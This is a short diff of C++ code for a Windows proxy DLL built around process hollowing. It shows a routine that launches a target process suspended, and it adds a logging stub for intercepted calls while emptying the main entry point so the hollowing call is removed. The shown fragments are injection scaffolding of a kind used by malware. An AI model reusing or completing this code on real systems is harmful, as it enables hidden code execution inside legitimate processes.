@@ -2,6 +2,10 @@
 #include <windows.h>
 #include <iostream>
 #include <string>
+#include <fstream>
+
+#include <windows.h>
+#include <string>
 #include <vector>
 
 #include "process_hollowing.h"
@@ -43,7 +47,7 @@ int LoadExeIntoMemory() {
     memset(&PI_ProcessInfo, 0, sizeof(PI_ProcessInfo));
     PI_StartupInfo.cb = sizeof(PI_StartupInfo);
     if (!CreateProcessA(NULL, lpTargetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &PI_StartupInfo, &PI_ProcessInfo)) {
-        MessageBox(0, "Erro ao criar processo alvo", "Proxy Error", MB_ICONERROR);
+        MessageBox(0, "Erro ao criar processo", "Error", MB_ICONERROR);
         return -1;
     }
     BOOL success = FALSE;
@@ -65,8 +69,26 @@ int LoadExeIntoMemory() {
     } else {
         TerminateProcess(PI_ProcessInfo.hProcess, 0);
     }
+    return 0;
+}
+
+extern "C" void FakeFunctionCall(const char* fakeFunctionName, void* arg1, void* arg2, void* arg3, void* arg4) {
+    std::ofstream logFile;
+    logFile.open("dll_logs.txt", std::ios::app);
+    if (logFile.is_open()) {
+        logFile << "[CALL] " << fakeFunctionName 
+                << " (arg1: " << arg1 
+                << ", arg2: " << arg2 
+                << ", arg3: " << arg3 
+                << ", arg4: " << arg4 << ")" << std::endl;
+        logFile.close();
+    }
 }
 
 void YourMain() {
-    LoadExeIntoMemory();
+
+}
+
+void YourEnd() {
+    
 }
